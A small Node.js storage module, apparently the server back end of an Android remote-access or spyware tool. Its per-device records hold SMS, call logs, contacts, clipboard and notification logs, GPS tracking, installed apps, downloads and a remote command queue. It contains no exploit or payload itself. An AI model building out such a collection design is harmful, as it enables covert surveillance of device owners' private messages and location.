// not yet time to add details, I would determine DB structure soon (not tonight abeg)
// Funny thing is, I am thinking of using a web interface to manage the data that'll be received from the user's android device.
// Maybe I should even design that interface first, and work the main code later. Let me start work on assets/webpublic then. See ya!

const
    lowdb = require('lowdb'),
    FileSync = require('lowdb/adapters/FileSync'),
    path = require('path'),
    adapter = new FileSync('./maindb.json'),
    db = lowdb(adapter);

db.defaults({
    admin: {
        username: 'admin',
        password: '',
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write()

class clientdb {
    constructor(clientID) {
        let cdb = lowdb(new FileSync('./clientData/' + clientID + '.json'))
        cdb.defaults({
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0
            },
            downloads: [],
            currentFolder: []
        }).write()
        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};


